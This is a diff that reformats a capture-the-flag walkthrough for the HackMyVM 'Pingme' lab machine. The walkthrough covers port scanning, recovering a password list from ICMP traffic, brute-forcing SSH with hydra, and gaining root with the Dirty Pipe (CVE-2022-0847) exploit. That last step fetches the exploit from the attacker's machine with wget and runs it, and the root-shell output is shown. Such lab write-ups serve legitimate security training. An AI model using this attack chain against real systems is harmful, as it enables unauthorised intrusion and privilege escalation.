@@ -1,10 +1,19 @@
 ### Write up for https://hackmyvm.eu/machines/machine.php?vm=Pingme ###
 
+## Walkthrough
+
+
+
+```bash
 ip=<machines ip>
 url=http://$ip
+```
 
+```bash
 threader3000
+```
 
+```text
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
 | ssh-hostkey: 
@@ -15,9 +24,12 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: nginx/1.18.0
 |_http-title: Ping test
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
 
 
-//visiting the website we see pingme, checking the page source it states ICMP packates and nothing to see here.
+```bash
+visiting the website we see pingme, checking the page source it states ICMP packates and nothing to see here.
+```
 
 its Wireshark time
 
@@ -36,7 +48,9 @@ at the end you will see some HEX and the translation
 Copy as printable text (each one) 
 Create a dict.txt and paste them there.
 
+```bash
 pico dict.txt 
+```
 paste 
 ctrl + x    
 y
@@ -45,39 +59,61 @@ we can also find the username from wireshark which is pinger
 
 since we have a dict and a username then its time for hydra
 
+```bash
 hydra -l pinger -P dict.txt  $ip -s 22 -t 64 ssh
+```
 
+```bash
 ssh pinger@$ip
+```
 
+```bash
 cat user.txt
+```
 
+```bash
 pinger@pingme:/tmp$ uname -a
+```
+```text
 Linux pingme 5.10.0-11-amd64 #1 SMP Debian 5.10.92-1 (2022-01-18) x86_64 GNU/Linux
+```
 
-//can be exploited with the new exploit DIRTY PIPE
+can be exploited with the new exploit DIRTY PIPE
 
 On our machines terminal
+```bash
 git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git
 cd CVE-2022-0847-DirtyPipe-Exploit/
 ls
+```
 ./compile.sh 
+```bash
 python3 -m http.server 80
+```
 
 back to pinger
 
+```bash
 cd /tmp
 wget <our machines ip>/exploit
 chmod +x exploit
+```
 ./exploit
 
+```bash
 pinger@pingme:/tmp$ ./exploit 
+```
 Backing up /etc/passwd to /tmp/passwd.bak ...
 Setting root password to "aaron"...
 Password: Restoring /etc/passwd from /tmp/passwd.bak...
 Done! Popping shell... (run commands now)
 id
+```text
 uid=0(root) gid=0(root) groups=0(root)
 pwd
 /root
+```
+```bash
 ls 
+```
 root.txt
